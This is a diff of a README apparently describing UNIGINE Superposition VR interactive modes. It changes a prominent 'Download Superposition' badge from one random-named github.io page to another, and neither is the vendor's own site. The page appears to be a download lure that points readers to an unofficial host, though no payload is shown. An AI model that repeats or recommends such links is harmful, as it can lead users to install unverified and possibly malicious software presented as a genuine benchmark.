@@ -24,7 +24,7 @@ Install SteamVR or vendor runtime, launch Superposition, pick VR preset, clear p
 | :--- | :--- |
 | **Get UNIGINE Superposition VR interactive modes** | Placeholder link for Superposition page listing **UNIGINE Superposition VR headset compatibility list**. |
 
-[![Download](https://img.shields.io/badge/Download-Superposition-green?style=for-the-badge)](https://fordchangjcqy.github.io/.github/unigine-superposition-vr-interactive-modes)
+[![Download](https://img.shields.io/badge/Download-Superposition-green?style=for-the-badge)](https://dariobeasleydkan.github.io/.github/unigine-superposition-vr-interactive-modes)
 
 ## System Requirements
 
